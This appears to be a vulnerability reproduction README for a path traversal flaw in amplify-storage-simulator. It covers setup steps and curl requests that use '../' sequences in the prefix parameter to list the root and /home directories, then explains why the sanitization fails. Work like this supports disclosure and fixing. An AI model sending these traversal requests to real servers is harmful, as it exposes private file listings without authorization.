# VULN-002 Reproduction: Path Traversal in amplify-storage-simulator

Standalone reproduction — no monorepo build needed.

## Setup (3 commands)

```bash
cd vuln-002-repro
npm install
node server.js
```

## Exploit (in a second terminal)

```bash
# 1. Normal request (baseline — returns sample file content)
curl http://localhost:20005/test-bucket/sample.txt

# 2. PATH TRAVERSAL — list root filesystem
#    Adjust the number of ../ based on bucket depth (server prints the right commands)
curl "http://localhost:20005/test-bucket/?prefix=../../../../../.."

# 3. PATH TRAVERSAL — list /home/
curl "http://localhost:20005/test-bucket/?prefix=../../../../.."
```

The server auto-calculates the correct traversal depth and prints ready-to-paste
curl commands on startup.

## How it works

The `prefix` query parameter is attacker-controlled and concatenated into the file
path with only a single-character sanitization strip (removes one leading `.` or `/`).
The `path.normalize + path.join` combination with the user-controlled prefix allows
escaping `localDirectoryPath`.

In the real amplify-storage-simulator, the LIST handler uses `globSync('**/*')` which
recursively enumerates ALL files under the traversed path — exposing filenames, sizes,
and timestamps of every file on the system.
